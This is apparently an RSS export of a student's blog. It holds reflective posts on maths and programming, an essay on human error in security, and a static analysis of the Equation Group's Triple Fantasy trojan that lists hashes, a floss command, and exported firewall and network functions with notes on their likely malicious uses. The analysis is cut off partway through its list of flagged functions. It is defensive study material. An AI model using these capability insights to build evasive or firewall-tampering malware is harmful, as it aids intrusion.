<p>Results week anticipation was a slow burn—a month of waiting, with each passing day adding to the anxieties that only a student awaiting their results could understand. In a world that often values quantifiable results, this number seemed to hold such power, as if it could substantiate intelligence, effort, or even a sense of belonging.</p>
<p>As I received the results from Discrete Mathematics, shared on LinkedIn, I was promptly reminded of my younger self, a version of me who adored English yet couldn’t seem to grasp mathematics. This unassailable wall, my “nightmare subject” that couldn’t possibly play a role in my education in future. I imagine she may have even laughed at the fact I had “received a maths result” and was feeling excited about it rather than pure dread. A mixture of logic and precision seemed impossible for someone so entangled in abstract concepts and literary ideas so much so that I believed my brain was simply at odds with it.</p>
<p>My aversion wasn’t carried from childhood, but rather something I have developed almost as a defence mechanism, or out of spite, to avoid a sense of failure from a subject I ‘didn’t understand’. There was, in fact, one particular experience that solidified my withdrawal from maths, a moment in which I had developed an evolutionary switch to tune out any discussion of numbers and equations.</p>
<p>I often think back to that year, Year 10 where the limits to my patience and self-belief were constantly being pushed. I do admit that it was a mix of things that lead to my pessimistic mindset, one being my own stubborn resistance, and all the casual distractions I occupied my time, showcasing a student with a lack of interest, never potential. At this point, my habits had led me to fall behind in my understanding yet rather than take accountability, I simply sat at the back of the classroom, laptop open, laughing quietly with friends. Yes, I was THAT classmate. Guilty.</p>
<p>I understand why my teacher had his frustrations towards me, as I wasn’t exactly a model student. However, halfway through the year, a change took place. I knew deep down within my heart that I wanted to take a different approach, and finally try! Inspired by the efforts I was putting into both my English and Arts subjects, I wanted to stop hiding behind a nonchalant attitude. I packed up my desk, and moved to a table at the front of the class, hoping I could still catch an opportunity to immerse myself in the lessons.</p>
<p>There was a moment that has lingered with me going on 10 years now, whereby in my struggling efforts to catch-up, I had asked my teacher for help. I was told that I “should already know this”, and I “should know better”, and just like that I had a door closed in my face—a definitive answer to a question I didn’t even know I had asked about how he viewed me. Not as a student, but a lost cause.</p>
<p>“Maybe I am too far behind”, I thought. “Maybe I’ve lost the right to be taught.”</p>
<p>There had never been a single moment that has stayed with me for so long, and for years I let myself believe that I was ‘unteachable’ in maths, that my brain simply could not comprehend it. With this experience, I created a self-imposed limitation purely born out of a story with a sour ending and avoided maths altogether. And so, I engrossed myself in Literature and my love for language where I felt at home and where my efforts felt appreciated and acknowledged.</p>
<p>Reflecting on this journey and the release of my results, I came to realise something profound about this entire experience: no one is truly ‘unteachable’. The labels we place on ourselves, or worse— the labels placed on us by others— do not define what we are truly capable of achieving. It took me ten years to conclude that my teacher’s words, whilst harmful, did not determine my abilities. It is simply one perspective that I had perhaps internalised way too quickly. It is due to the guidance and support from the Deakin University mathematics department that allowed me to break free from these limitations.</p>
<p>What I’ve learnt is that being ‘unteachable’ is simply a myth, a construct that holds people back from realising their true potential. Learning has always been a combination of persistence, and self-belief, and accepting the help that we need. Our progress as life-long learners is often energised by the support of others, and especially by those who see our potential even when we begin to doubt ourselves.</p>
<p>In many beautiful ways, this result represents more than just a grade, or a number on a screen; its a testament to a journey of being ‘unteachable’ to flourishing into an active learner. It illustrates that even subjects that may seem out of reach CAN be learned with the right mindset and the right people around to guide you.</p>
<p>And perhaps most importantly, my story speaks to the role educators play in shaping both the mindset, and paths of students. A single dismissive comment can sting for years, fostering self-doubt and hesitation. But a single moment of encouragement from a passionate team can just as easily become a turning point, a flicker of a spark that ignites curiosity and resilience.</p>
<p>So, to my younger self, and to anyone else who has got this far: you are teachable, and you always were. Our limitations are only as strong as the belief we place in them. Embrace the art of becoming, and remind yourself that every experience holds a valuable lesson, even if it takes years to realise it.</p>]]></content:encoded>
            <category>Reflections</category>
        </item>
        <item>
            <title><![CDATA[The Reaction Timer That Made Me Love Programming]]></title>
            <link>https://paigehai.github.io/blog/reaction-timer</link>
            <guid>https://paigehai.github.io/blog/reaction-timer</guid>
            <pubDate>Tue, 17 Sep 2024 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/timer-thumb.png" alt="Reaction Timer Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>A beginner coding journey sparked by building a simple reaction timer and the unexpected joy that came with it.</p>
<p>My journey in programming was admittedly not a pretty one. Initially, I struggled quite a lot to get over the steep learning curve of C#, and C++. My aversion to it was largely attributed to my confusion to its structure. It always felt like no matter how many program I was creating, I wasn’t quite grasping the fundamental composition. With a background in graphic design, I adore creating structured designs that serve a clear purpose and so grappling with what I thought was a lack of design convention was difficult. As it turns out, I just didn’t dive deep enough yet!</p>
<p>Starting with C++ was such a blessing, however at the time I was not a fan, as I felt it had a lack of rules with a lot of its functions. Moving into C# provided me with a little more structure and rules but nothing like what I knew from Python, HTML, CSS or JavaScript.</p>
<p>This trimester, in my Object-Oriented Programming unit, I undertook a rather exciting project which ultimately changed my perspective on programming completely. It seems dramatic, but when I have a ‘eureka’ moment it feels like I’ve made a huge advancement in my knowledge of these topics.</p>
<p>As a reaction timer game, its purpose — as the name suggests — is to track the reaction time of a user in three games and calculate the three game average, which seems simple enough. It doesn’t sound too different to other programs that I have created for my university programming units. However, this one was different (it’s not like other programs!!).</p>
<p>How did one little program change my entire perspective on programming as a whole? Simply put, it was the introduction of state design, and by extension state design diagrams.</p>
<p>As someone from a design and marketing background, this felt like my two worlds colliding. I finally saw my purpose in this project as a result of the introduction of structured design principles in programming. Upon the creation of the finite state diagram, I found it much easier to create my program. Abstracting all the important features from the main program made it much more visually cohesive with each state class being clearly structured.</p>
<p>Implementing this design aspect made the coding simpler, however creating unit tests for each and every aspect was the most challenging part of the process. Thankfully, my meticulously crafted FSM design came to the rescue! I constantly referred to this to inform my unit tests to ensure each edge case was considered. Additionally, this meant I was able to confirm every state trigger was working as expected such that functionality is consistent between games.</p>
<p>Upon completion of the program, I felt like I had created a thoughtful, well-designed program that was efficient and served its purpose whilst also adhering to the client requirements. I was able to learn about how to implement FSM diagrams into a functional program which greatly sped up the coding process.</p>
<p>I write and debug all my programs within Visual Studio Code in C# (why did they stop Visual Studio 2022 support for Mac’s?), and I applied all core components of object-oriented programming — abstraction, encapsulation, inheritance, and polymorphism. Exploring the more dynamic aspects of OOP has given me a new perspective on programming, and with design conventions in the mix, OOP might have just become my perfect programming paradigm.</p>
<p>This project highlighted how important it was for me to ask questions, and rely on peers and tutors for advice and guidance especially for higher-grade tasks. Being able to describe my complications with others also helped me develop my conversational skills when discussing the more technical aspects of object-oriented programming. Creating diagrams before the actual implementation of a project to such an in-depth extent immensely decreases coding time, as each aspect of the program has been designed all the way down to the intricate details.</p>
<p>I am incredibly interested in implementing these ideas and concepts into more programs in hopes to further expand my skills in object-oriented design. This project made me realise that there is always a niche of every skill that aligns with your interests. I felt like programming was confusing and too complex, however upon introduction of design documentation I was able to find a programming niche that aligned with skills I had already mastered, and who knew this would make all the difference?</p>
<p>If you are someone who was also averse to programming like I was, I can promise that there will be a type of programming that you will love! Whether it’s HTML, CSS, or JavaScript for more design-minded folk, or Python for those wanting to explore scripting, and data visualisation (more on this later, watch this space!)</p>
<p>Have you ever had that ‘eureka’ moment when learning something you weren’t enjoying? I’d love to hear about it, because it’s the best feeling when you finally ‘get’ something, that you didn’t understand for so long.</p>]]></content:encoded>
            <category>Programming</category>
        </item>
        <item>
            <title><![CDATA[Problems of Employee Security Insensibility]]></title>
            <link>https://paigehai.github.io/blog/employee-security-insensibility</link>
            <guid>https://paigehai.github.io/blog/employee-security-insensibility</guid>
            <pubDate>Tue, 02 Jul 2024 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/sensibility-thumb.png" alt="Employee Insensibility Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>A breakdown of common organisational security pitfalls and how human factors affect cybersecurity resilience.</p>
<p>Data breaches have become increasingly common as our technical landscape shifts to new heights (with new threats), and as such austere countermeasures are constantly being implemented in organisational Information Security processes. Among Australia’s <a href="https://www.oaic.gov.au/privacy/notifiable-data-breaches/notifiable-data-breaches-publications/notifiable-data-breaches-report-july-to-december-2023#snapshot" target="_blank" rel="noopener noreferrer" class="">notifiable data breaches</a> is an unfortunate trend that manifests a terrible problem — data breaches caused by human error. This very security dilemma stems from a combination of both inadequate training and a lack of straightforward information made for the regular employee.</p>
<p>As demonstrated throughout history, humanity continues to prove that they are the weakest link under many different circumstances, and Cyber Security is no exception to this. One’s proclivity to keeping life as simple as possible, through limiting complicated, elaborate tasks seems to outweigh the responsibility of keeping information secure. <a href="https://www.oaic.gov.au/privacy/notifiable-data-breaches/notifiable-data-breaches-publications/notifiable-data-breaches-report-july-to-december-2023#snapshot" target="_blank" rel="noopener noreferrer" class="">Research</a> conducted by the OAIC reveals that at least 30% of all breaches are a result of the illustrated dilemma above: the mishandling of sensitive information and the exploitation of human elements that directly or indirectly cause major security incidents.</p>
<p>InfoSec professionals are fervently scrambling to secure business assets from threat actors. Through the implementation of security processes informed by systematic analysis, the confidentiality, integrity, and availability (CIA) of organisational information can be better protected. Despite these expensive, and somewhat esoteric initiatives, <a href="https://www.statista.com/topics/10175/cyber-security-in-australia/#editorsPicks" target="_blank" rel="noopener noreferrer" class="">research</a> by Statista reports that data breaches are costing an average of $6.6B AUD (yes with a ‘b’!) per leak, and this figure is increasing each year.</p>
<p>As our technology becomes more robust, so too does the strength of our adversaries. Thus, our procedures, protocols, and defenses must advance in parallel, otherwise the impact of these threats may continue to get worse.</p>
<p>Cyber Security tends to be quite a polyvocal topic within internal teams, and as such it can be difficult to pinpoint the steps needed to better educate employees on their responsibilities in relation to their information management. Historically, malicious hackers will prioritise maintaining persistence on an organisational system as this information is incredibly lucrative on a black market. As much as <a href="https://www.landers.com.au/legal-insights-news/firm-supports-privacy-awareness-week-2024#:~:text=Contact%20and%20identity%20information%20continue,as%20date%20of%20birth%2C%20passport" target="_blank" rel="noopener noreferrer" class="">88%</a> of breaches involved an individuals contact information, such as names, addresses, and phone numbers to be stolen by threat actors.</p>
<p>Although solutions for these problems can come with some dollars to invest, and a chat over coffee with an outsourced Cyber Security expert, the technical expertise of someone who has worked in the industry for many moons is more often than not one of very high technical understanding. This does not translate to the everyperson, whereby something so obvious to an expert is simply junk info for an employee. The ability to translate these ideas into tangible information to your everyday administrator is the first step in a strong cyber defense.</p>
<p>I mentioned an ‘outsourced’ Cyber Security expert in the paragraph above, and the reason being is that although companies have encouraged the development of large IT teams, we don’t see this too often for CyberSec.</p>
<p>More often than not, these IT employees are expected to take on the role of de-facto Cyber Security professional which can lead to some knowledge gaps. In saying this, companies should consider developing a Cyber Security team in which their aim is to not only provide dedicated experience to cyber defense, but also advocate for more diverse training opportunities. A lack of these types of professionals in a business means that in the event of a cyber attack, the loss of trust, finances, and data is far greater than it could have been.</p>
<p>It is not uncommon to work at a company that provides little to no technological induction nor any further training on protecting one’s information. These experiences demonstrate another fundamental problem of employees being responsible for data breaches, and that is the lack of constant, and frequent training by these cyber professionals. This lack of Information Security Awareness (ISA) means that employees are often left to answer their own questions, and therefore create unsafe, penetrable solutions to their IT problems.</p>
<p>We see this in circumstances in which employees forget to lock their computers as they leave the room, connect to unsecured Wi-Fi networks (god forbid it’s a Rogue AP), or create easily hackable passwords.</p>
<p>The most obvious solution to this seems to be to create a procedure in which more senior employees teach their downline the correct method of data protection. However, this can set a dangerous precedent. Whilst a senior employee may teach various methods, there is no way to confirm whether these methods are actually safe, and informed by legitimate legal procedures.</p>
<p>It may seem like there is no foolproof way to appropriately prepare employees for protecting their devices, and this is true. Regardless of advocacy, training days, and well-informed procedures, there will always be room for error. Yet, there is always the opportunity to mitigate risks. Choosing to work alongside an organisation that can present the more technical information to employees in a more rudimentary way, (such as <a href="https://www.itconnexion.com/it-security/cyber-security-awareness-training/" target="_blank" rel="noopener noreferrer" class="">ITConnexion’s Cyber Security Awareness Training</a> which involves fully simulated attacks for hands-on threat prevention experience), employees have the ability to better understand how to deal with these types of threats in a simulated environment. This gives them the perfect leverage if the situation ever actually happens.</p>
<p>Just like Fire Warden training or CPR training, ISA processes are created to mitigate risks and protect employees (and their information) which means there should be importance placed on this type of training just like its WHS counterparts. InfoSec is already becoming a prevalent part of the day-to-day operations of private and public sector corporations, so getting ahead of the curve and being proactive comes at a much better long-term benefit than being reactive.</p>
<p>As the main messengers of information in the company and to consumers, it is more important than ever to make sure employees truly understand – in a way that they understand — how imperative it is to protect their devices. In addition, the consideration of employing a Cyber Security professional (just like a company would hire an HR professional, or a financial controller) should become a higher priority as more cyber threats present themselves.</p>
<p>Whilst we may not be able to remove the human element in Cyber Security, we can find many, creative ways to mitigate potential losses through these methods.</p>
<p>We are only as strong as our defense against these threats, so awareness on a wider scale for all employees is imperative as threats become more sophisticated and dangerous. The number of data breaches as a result of human error will never be zero, but any circumstance where less data is lost is a win. If you take anything from this post, I implore you to consider supporting employees as a proactive measure of security protection.</p>
<p>Cyber Security is just as exciting as it is scary. It is through advocacy, and support from professionals in the field that employees will feel that their actions will directly help an organisations defense, which is the type of security utopia we want to work towards.</p>]]></content:encoded>
            <category>Analysis</category>
            <category>Human Factor</category>
        </item>
        <item>
            <title><![CDATA[Malware Deep Dive – Equation Triple Fantasy]]></title>
            <link>https://paigehai.github.io/blog/triple-fantasy-deepdive</link>
            <guid>https://paigehai.github.io/blog/triple-fantasy-deepdive</guid>
            <pubDate>Mon, 24 Jun 2024 00:00:00 GMT</pubDate>
            <description><![CDATA[<img]]></description>
            <content:encoded><![CDATA[<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware-thumb.png" alt="Malware Deep Dive Thumbnail" style="width:100%;max-width:500px;height:auto"></div>
<p>An investigation into one part of the highly sophisticated Equation Group APT.</p>
<p>Earlier this year, I was afforded the pleasure of undertaking a static analysis of the <strong>Triple Fantasy</strong> malware. I am a firm believer that hands-on experience with these types of exercises is crucial in understanding how malware works and how it spreads due to human error.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-introduction">1. Introduction<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#1-introduction" class="hash-link" aria-label="Direct link to 1. Introduction" title="Direct link to 1. Introduction" translate="no">​</a></h2>
<p>Trojan's are sophisticated in that they can evade detection from users very easily, due to technical and complex obfuscation methods employed. My objective for this static analysis is to dissect Triple Fantasy Trojan and develop my understanding for how these particular viruses work in a safe virtual machine environment. This static analysis serves as a starting point for the development of my skills utilising a virtual machine and is a representation of my personal endeavour to contribute to discussions on topics that are still new to me.</p>
<p>By the conclusion of this analysis, a list of responses to the following questions will be provided:</p>
<ul>
<li class=""><strong>What is the file type?</strong> Different file types have different behaviours and characteristics so understanding the file type can give insight into how it might behave and what potential vulnerabilities it may exploit.</li>
<li class=""><strong>Does the file have a packer?</strong> Packed files are created to evade detection from programs like Microsoft Defender and Malwarebytes, so identifying if the sample is packed is really crucial in determining if it's malicious and contains more information that we are unable to see until the sample is unpacked.</li>
<li class=""><strong>Are there any suspicious strings in the file?</strong> Malware often contains strings that can reveal certain information about its intent or origins, so by searching for suspicious looking strings it can give us clues about the sample’s intentions.</li>
<li class=""><strong>Are there any encoded strings?</strong> Encoded strings are another common technique used by malware to obfuscate its code. By identifying and decoding these strings, we can discover more information about the sample.</li>
<li class=""><strong>If the malware is packed, how do we unpack it?</strong> The sample file can be unpacked through malware analytic tool Exeinfo PE which provides information on how to unpack the file. By unpacking the file, we are able to explore the full extent of the sample with all the additional code exposed.</li>
<li class=""><strong>Is the file definitively malware?</strong> Regardless of the fact that malware has been specifically sought, this still requires a complete analysis to ensure what is being identified can be confirmed as being malware.</li>
</ul>
<p>The objective of this analysis is to comprehensively address all questions and present a succinctly formatted, readable report.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-analytical-tools">2. Analytical Tools<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#2-analytical-tools" class="hash-link" aria-label="Direct link to 2. Analytical Tools" title="Direct link to 2. Analytical Tools" translate="no">​</a></h2>
<p>This report has been produced with the assistance of a host of analytical malware tools that have allowed the identification of various mechanisms of the Triple Fantasy malware. Such mechanisms that will be explored include decoded strings, and Dynamic Link Library methods calls that signify the files malicious intent and payload. Tools such as pestudio, cmder, in conjunction with commands such as floss and capa have been utilised to create the evidence that you will read in this report.</p>
<ul>
<li class=""><a href="https://www.virustotal.com/" target="_blank" rel="noopener noreferrer" class=""><strong>VirusTotal</strong></a>: file inspection via antivirus engines</li>
<li class=""><strong>pestudio</strong>: categorized structure and metadata analysis</li>
<li class=""><strong>HxD</strong>: hex editor for identifying file headers</li>
<li class=""><strong>cmder</strong>: terminal emulator for command-line tools</li>
<li class=""><strong>floss</strong>: function-level string extraction</li>
<li class=""><strong>capa</strong>: detects capabilities and malware behaviors</li>
<li class=""><strong>Exeinfo PE</strong>: helps detect packers and unpacking methods</li>
</ul>
<p>All analysis was performed on the file <code>TripleFantasy_9180D5AFFE1E5DF0717D7385E7F54386</code> using a Windows 10 VM with the FLARE-VM toolkit for safety and snapshot support.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="21-methodology">2.1 Methodology<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#21-methodology" class="hash-link" aria-label="Direct link to 2.1 Methodology" title="Direct link to 2.1 Methodology" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="211-fingerprinting-the-malware">2.1.1 Fingerprinting the Malware<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#211-fingerprinting-the-malware" class="hash-link" aria-label="Direct link to 2.1.1 Fingerprinting the Malware" title="Direct link to 2.1.1 Fingerprinting the Malware" translate="no">​</a></h4>
<p>The sample will be scanned using <a href="https://www.virustotal.com/" target="_blank" rel="noopener noreferrer" class="">VirusTotal</a>.</p>
<ul>
<li class=""><code>Win32/Trojan</code></li>
<li class=""><code>Packed.Win32</code></li>
<li class=""><code>Dropper.Generic</code></li>
</ul>
<p>This immediate red flag validated that further analysis was necessary.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="212-file-type-and-headers">2.1.2 File Type and Headers<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#212-file-type-and-headers" class="hash-link" aria-label="Direct link to 2.1.2 File Type and Headers" title="Direct link to 2.1.2 File Type and Headers" translate="no">​</a></h4>
<p>Using HxD, I will analyse the file type to understand its purpose.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="213-finding-malicious-artefacts">2.1.3. Finding Malicious Artefacts<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#213-finding-malicious-artefacts" class="hash-link" aria-label="Direct link to 2.1.3. Finding Malicious Artefacts" title="Direct link to 2.1.3. Finding Malicious Artefacts" translate="no">​</a></h4>
<ul>
<li class=""><strong>URL Artefacts</strong>: pestudio &gt; cmder (“floss malware.exe &gt; output.txt”: search for ‘http’, ‘.com’, ‘.net’ etc.)</li>
<li class=""><strong>File Artefacts</strong>: pestudio: .dll files</li>
<li class=""><strong>Packing Artefacts (Raw vs Virtual Size)</strong>: pestudio</li>
<li class=""><strong>Code Artefacts</strong>: capa: cd Desktop, capa, capa -v, capa -vv</li>
</ul>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-static-analysis">3 Static Analysis<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#3-static-analysis" class="hash-link" aria-label="Direct link to 3 Static Analysis" title="Direct link to 3 Static Analysis" translate="no">​</a></h2>
<p>A static analysis is the process of analysing a sample without actually detonating the sample, through various analysis methods. This includes observing the code for any irregularities or suspicious information as well as signs of malicious intent within its function calls.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="31-fingerprinting-the-malware">3.1 Fingerprinting the Malware<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#31-fingerprinting-the-malware" class="hash-link" aria-label="Direct link to 3.1 Fingerprinting the Malware" title="Direct link to 3.1 Fingerprinting the Malware" translate="no">​</a></h3>
<p>Upon deciding on the tools that will be needed for this static analysis, the first step is to utilise VirusTotal to gain an understanding of the file details through antivirus scanning. This analysis can provide us with details regarding the files PE header, hash identifiers, and its programming language. Figure 1 demonstrates this step.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware1.png" alt="Malware Analysis 1" style="width:100%;max-width:1000px;height:auto"><br><em>Figure 1: VirusTotal.com scan of sample malware</em></div>
<p>The above figure displays an interface where after the sample was submitted, the VirusTotal antivirus engines provided additional details as to what may be contained within the infected file. Identifiers such as “Trojan”, “Equation”, and “TripleFantasy”, indicate that these engines have correlated the contents of the file to known malware. This result demonstrates that the sample is indeed malware of some kind.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware2.png" alt="Malware Analysis 2" style="width:100%;max-width:1000px;height:auto"><br><em>Figure 2: ‘Details’ tab of VirusTotal scan</em></div>
<p>VirusTotal’s ‘Details’ tab provides us with some additional information with regards to the sample, in particular its hash identifiers which consist of the following:</p>
<ul>
<li class=""><code>9180d5affe1e5df0717d7385e7f54386</code></li>
<li class=""><code>4ce6e77a11b443cc7cbe439b71bf39a39d3d7fa3</code></li>
<li class=""><code>24b7e7553b1aa241997e28775d3952c4cb885056c4606cbed9b450320b601255</code></li>
</ul>
<p>This tab also gives information with regards to the type of executable the sample is, which is a portable executable file in 32-bit format. Included in this is a list of all the file names that have been recorded since the files inception. The file name corresponding to my sample is the following:</p>
<p><strong>TripleFantasy_9180D5AFFE1E5DF0717D7385E7F54386</strong></p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware3.png" alt="Malware Analysis 3" style="width:100%;max-width:300px;height:auto"><br><em>Figure 3: Malware history details</em></div>
<p>This VirusTotal scan shows that the first time this sample was seen “in the wild” was on 2016-11-25, and the file version is 0.1.2.6 (pictured in Figure 4) with an original name of ahlhcib.dll.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware4.png" alt="Malware Analysis 4" style="width:100%;max-width:200px;height:auto"><br><em>Figure 4: File version shown in pestudio</em></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="32-analysing-the-file-type">3.2 Analysing the File Type<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#32-analysing-the-file-type" class="hash-link" aria-label="Direct link to 3.2 Analysing the File Type" title="Direct link to 3.2 Analysing the File Type" translate="no">​</a></h3>
<p>The HxD analysis tool has provided some key information with regards to the type of file that the sample is. Denoted through the use of the hexadecimal characters ‘4D’, ‘5A’, as well as the ‘MZ’ header on the right panel, the sample is an executable file.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware5.png" alt="Malware Analysis 5" style="width:100%;max-width:600px;height:auto"><br><em>Figure 5: HxD analysis of file with file identifiers</em></div>
<p>This concludes the fingerprint analysis portion of the report. We have successfully identified the file type, the hash identifiers, file history, and entropy. This serves as the foundation for the remainder of the analysis, of which we will utilise this information to extract more from the sample through more advanced tools.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="33-finding-malicious-artefacts-urls">3.3 Finding Malicious Artefacts: URLs<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#33-finding-malicious-artefacts-urls" class="hash-link" aria-label="Direct link to 3.3 Finding Malicious Artefacts: URLs" title="Direct link to 3.3 Finding Malicious Artefacts: URLs" translate="no">​</a></h4>
<p>Utilising pestudio I analysed the sample for any indication of a URL through the various segments of information on the left-hand side of the program (pictured in Figure 5). As demonstrated in my video analysis, I was unable to find a link to a website through this method.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware6.png" alt="Malware Analysis 6" style="width:100%;max-width:200px;height:auto"><br><em>Figure 6: Left-hand side panel of pestudio</em></div>
<p>To ensure that no items were being missed, I proceeded to conduct an analysis using cmder and the ‘floss’ command. By inputting this code:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">floss C:\Users\Alice\Downloads\TripleFantasy_9180D5AFFE1E5DF0717D7385E7F54386</span><br></span></code></pre></div></div>
<p>I was able to obtain a list of static strings, and through searching the words ‘http’, ‘com’, and ‘net’ my search came back unsuccessful. With both of these methods employed I am confident that there were no URL’s present in the malware, and it is an OS resource-based malware.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="331-finding-malicious-artefacts-files">3.3.1 Finding Malicious Artefacts: Files<a href="https://paigehai.github.io/blog/triple-fantasy-deepdive#331-finding-malicious-artefacts-files" class="hash-link" aria-label="Direct link to 3.3.1 Finding Malicious Artefacts: Files" title="Direct link to 3.3.1 Finding Malicious Artefacts: Files" translate="no">​</a></h4>
<p>File artefacts were obtained through the use of floss commands and pestudio, whereby my objective was to discover any deliberately obfuscated files that needed to be encoded. These types of tactics can lead to a high entropy which is an indicator that a file is malware. In practice, when the entropy values are higher than expected (closer to the value 8), there is an assumption of unnecessary complexity occurring within the sample. With an entropy of up to 6.67 (pictured in Figure 6), alongside the encoded strings utilising floss, we can see that the sample is displaying characteristics of malware.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware7.png" alt="Malware Analysis 7" style="width:100%;max-width:200px;height:auto"><br><em>Figure 7: Floss decoded strings</em></div>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware8.png" alt="Malware Analysis 8" style="width:100%;max-width:400px;height:auto"><br><em>Figure 8: Entropy values within the sample</em></div>
<p>Through pestudio, we can identify the particular libraries that give the sample certain capabilities and within Figure 9, it should be noted that there are many libraries that have a concerning number of imports, with KERNEL32.dll being the highest at 25. Upon further inspection into these imports, we have a list of ‘blacklisted’ imports (pictured in Figure 10). It must be noted that these don’t inherently confirm whether a file is malicious, however it does explicitly indicate that the sample is calling functions that could be used to perform malicious activities. These are denoted by the ‘flag’ indicator within pestudio.</p>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware9.png" alt="Malware Analysis 9" style="width:100%;max-width:1000px;height:auto"><br><em>Figure 9: Libraries that are being called within the sample</em></div>
<div style="text-align:center"><img src="https://paigehai.github.io/blog/malware10.png" alt="Malware Analysis 10" style="width:100%;max-width:200px;height:auto"><br><em>Figure 10: Flagged imports from KERNEL32.dll, and ADVAPI32.dll</em></div>
<p>Based on my analysis in pestudio, below is a list of strings that whilst they may not be malicious inherently could be used for malicious activities:</p>
<p><code>WinBomConfigureWindowsFirewall</code>
<code>WinBomConfigureHomeNet</code>
<code>ReleaseSingletons</code>
<code>IcfSubNetsToString</code>
<code>IcfSubNetsIsStringValid</code>
<code>IcfSubNetsGetScope</code>
<code>IcfSetServicePermission</code>
<code>IcfSetProfile</code>
<code>IcfRemoveDisabledAuthorizedApp</code>
<code>IcfRefreshPolicy</code>
<code>IcfOpenFileSharingPorts</code>
<code>IcfOpenDynamicFwPortWithoutSocket</code>
<code>IcfOpenDynamicFwPort</code>
<code>IcfIsPortAllowed</code>
<code>IcfIsIcmpTypeAllowed</code>
<code>IcfGetTickets</code>
<code>IcfGetProfile</code>
<code>IcfGetOperationalMode</code>
<code>IcfGetDynamicFwPorts</code>
<code>IcfGetCurrentProfileType</code>
<code>IcfGetAdapters</code>
<code>IcfFreeTickets</code>
<code>IcfFreeString</code>
<code>IcfFreeProfile</code>
<code>IcfFreeDynamicFwPorts</code>
<code>IcfFreeAdapters</code>
<code>IcfDisconnect</code>
<code>IcfConnect</code>
<code>IcfCloseDynamicFwPort</code>
<code>IcfCheckAppAuthorization</code>
<code>IcfChangeNotificationDestroy</code>
<code>IcfChangeNotificationCreate</code>
<code>HNetSharingAndFirewallSettingsDlg</code>
<code>HNetSharedAccessSettingsDlg</code>
<code>HNetSetShareAndBridgeSettings</code>
<code>HNetGetSharingServicesPage</code>
<code>HNetGetShareAndBridgeSettings</code>
<code>HNetGetFirewallSettingsPage</code>
<code>HNetFreeSharingServicesPage</code>
<code>HNetFreeFirewallLoggingSettings</code>
<code>HNetDeleteRasConnection</code>
<code>DllUnregisterServer*</code>
<code>DllRegisterServer*</code>
<code>DllGetClassObject*</code>
<code>DllCanUnloadNow*</code>
<code>AlgUninstall* </code>(Application Layer Gateway protocols, could enable access to firewall manipulation and network communication.)</p>
<ul>
<li class="">Windows Operating System functions</li>
</ul>
<p>This list provides an insight into the custom functions that this sample has within its code.</p>
<ul>
<li class=""><strong>IcfSubNetsGetScope</strong> implies that the sample may be attempting to scrape for IP and network information.</li>
<li class=""><strong>IcfRemoveDisabledAuthorizedApp</strong> implies that the sample may remove authorised applications, and given the network communication focus of this sample it is safe to assume that this may be relating to Windows Firewall.</li>
<li class=""><strong>IcfOpenFileSharingPorts</strong> implies the opening of file sharing protocols, which may be used to propagate the malware across a network.</li>
<li class=""><strong>IcfGetAdapters</strong> implies the retrieval of adapters or interfaces within the infected system.</li>
<li class=""><strong>HNetDeleteRasConnection</strong> implies the removal of remote access connection, which could be used to disconnect or remove VPNs to avoid detection.</li>
<li class=""><strong>DllUnregisterServer</strong> and <strong>DllRegisterServer</strong> indicates the registering and unregistering of COM object registration information from the Windows Registry.</li>
</ul>
<p>The insights above suggest that whilst calling system .dll libraries may not be malicious there are still malicious functions that are being used within the sample. The implication of giving privileged access to modify network settings, and read data for sensitive information are all indicators of a malicious program. The call to DllUnregisterServer and DllRegisterServer is especially suspicious, as this could lead to implications with the systems functionality entirely as the Windows Registry is a crucial part of the Windows Operating System.</p>
<p>During the analysis within pestudio, I discovered more alarming functions by which the program had flagged and provided additional information with regards to their legitimate functions.
<code>Sandbox Evasion - Sleep</code>
<code>System Time Discovery - GetTickCount</code>
<code>System Time Discovery - GetSystemTimeAsFileTime</code>
<code>System Information Discovery - ExpandEnvironmentStrings</code>
